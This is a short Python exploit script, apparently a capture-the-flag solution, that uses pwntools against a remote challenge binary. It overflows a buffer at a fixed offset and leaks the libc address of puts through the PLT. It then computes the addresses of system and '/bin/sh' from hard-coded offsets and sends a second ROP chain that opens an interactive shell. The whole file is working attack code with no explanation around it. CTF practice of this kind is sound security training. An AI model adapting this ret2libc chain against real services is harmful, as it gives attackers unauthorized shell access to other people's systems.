```python
from pwn import *
import struct
r = remote('ctf.sharif.edu', 4801)
#r = process('./vuln4')
first = r.recvuntil('find puts yourself')
'''
EIP+0 found at offset: 22
'''
x = 'A'*22
# ordinal=004 plt=0x080483a0 bind=GLOBAL type=FUNC name=puts
x += p32(0x080483a0)
# disas main
x += p32(0x080484ea)
# vaddr=0x08049874 paddr=0x00000874 type=SET_32 puts
x += p32(0x08049874)
x += '\n'
r.send(x)
r.recv(1024)
libc_puts =  struct.unpack("I",r.recv()[:4].strip().ljust(4, '\x00'))[0]

# Build offsets to build ROP chain
libc = libc_puts - 0x0005fca0  
system = libc + 0x0003ada0
binsh = libc + 0x0015ba0b

# Send new ROP chain
x = 'A'*22
x += p32(system)
x += p32(0x080484ea)
x += p32(binsh)
x += '\n'

r.send(x)
r.interactive()
```
